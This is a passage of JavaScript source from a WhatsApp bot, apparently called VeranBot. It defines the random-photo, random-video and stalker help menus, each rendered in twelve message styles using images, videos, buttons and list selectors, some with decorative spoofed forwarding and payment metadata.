                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'randomphotomenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Random Photo* 」❍
│${setv} ${prefix}*aesthetic√*
│${setv} ${prefix}*coffee√*
│${setv} ${prefix}*wikimedia√*
│${setv} ${prefix}*wallpaper√*
│${setv} ${prefix}*art√*
│${setv} ${prefix}*bts√*
│${setv} ${prefix}*dogwoof√*
│${setv} ${prefix}*catmeow√*
│${setv} ${prefix}*lizardpic√*
│${setv} ${prefix}*goosebird√*
│${setv} ${prefix}*8ballpool√*
│${setv} ${prefix}*cosplay√*
│${setv} ${prefix}*hacker√
│${setv} ${prefix}*cyber√*
│${setv} ${prefix}*gamewallpaper√*
│${setv} ${prefix}*islamic√*
│${setv} ${prefix}*jennie√*
│${setv} ${prefix}*jiso√*
│${setv} ${prefix}*satanic√*
│${setv} ${prefix}*justina√*
│${setv} ${prefix}*cartoon√*
│${setv} ${prefix}*pentol√*
│${setv} ${prefix}*cat√*
│${setv} ${prefix}*kpop√*
│${setv} ${prefix}*exo√*
│${setv} ${prefix}*lisa√*
│${setv} ${prefix}*space√*
│${setv} ${prefix}*car√*
│${setv} ${prefix}*technology√*
│${setv} ${prefix}*bike√*
│${setv} ${prefix}*shortquote√*
│${setv} ${prefix}*antiwork√*
│${setv} ${prefix}*hacking√*
│${setv} ${prefix}*boneka√*
│${setv} ${prefix}*rose√*
│${setv} ${prefix}*ryujin√*
│${setv} ${prefix}*ulzzangboy√*
│${setv} ${prefix}*ulzzanggirl√*
│${setv} ${prefix}*wallml√*
│${setv} ${prefix}*wallphone√*
│${setv} ${prefix}*mountain√*
│${setv} ${prefix}*goose√*
│${setv} ${prefix}*profilepic√*
│${setv} ${prefix}*couplepp√*
│${setv} ${prefix}*programming√*
│${setv} ${prefix}*pubg√*
│${setv} ${prefix}*blackpink√*
│${setv} ${prefix}*randomboy√*
│${setv} ${prefix}*randomgirl√*
│${setv} ${prefix}*hijab√*
│${setv} ${prefix}*chinese√*
│${setv} ${prefix}*indo√*
│${setv} ${prefix}*japanese√*
│${setv} ${prefix}*korean√*
│${setv} ${prefix}*malay√*
│${setv} ${prefix}*thai√*
│${setv} ${prefix}*vietnamese√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/XmciIu1.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/XmciIu1.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'randomvideomenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Random Video* 」❍
│${setv} ${prefix}*tiktokgirl√*
│${setv} ${prefix}*tiktoknukthy√*
│${setv} ${prefix}*tiktokkayes√*
│${setv} ${prefix}*tiktokpanrika√*
│${setv} ${prefix}*tiktoknotnot√*
│${setv} ${prefix}*tiktokghea√*
│${setv} ${prefix}*tiktoksantuy√*
│${setv} ${prefix}*tiktokbocil√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/XmciIu1.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/XmciIu1.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'stalkermenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Stalker* 」❍
│${setv} ${prefix}*tiktokstalk√*
│${setv} ${prefix}*mlstalk√*
│${setv} ${prefix}*npmstalk√*
│${setv} ${prefix}*ghstalk√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/aA90Kwq.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/aA90Kwq.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
